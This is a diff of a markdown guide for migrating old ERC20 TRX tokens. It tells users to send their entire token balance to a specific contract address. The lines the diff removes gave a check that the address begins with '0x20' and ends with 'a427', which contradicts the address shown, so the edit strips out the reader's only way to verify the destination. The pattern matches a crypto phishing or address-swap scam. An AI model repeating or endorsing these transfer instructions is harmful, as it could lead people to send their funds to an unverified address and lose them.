@@ -16,7 +16,7 @@ Using the migration contract requires users to **pay the gas fee** on the Ethere
 
 **1. Access Your Wallet:** Check your TRX balance in the list of Ethereum tokens.
 
-**2. Send Tokens:** Send your old ERC20 TRX tokens to the migration smart contract address `0xd64B13423E764b2bC87cF11b85c669D8728c8b1a`. The migration smart contract address begins with `0x20` and ends with `a427`. The case of letters does not matter (lower case or upper case).
+**2. Send Tokens:** Send your old ERC20 TRX tokens to the migration smart contract address `0xd64B13423E764b2bC87cF11b85c669D8728c8b1a`. The case of letters does not matter (lower case or upper case).
 Choose to send the entire balance of TRX tokens. The migration contract will wait for the full balance to arrive before initiating the migration process to optimize due to high Ethereum gas fees, partially covered by the Tron Foundation.
 
 **3. Confirmation:** After the transaction is confirmed and broadcasted to the blockchain, the migration process will start, and your wallet will be credited with new TRX tokens. Depending on network usage, it may take 5–30 minutes to process the migration.
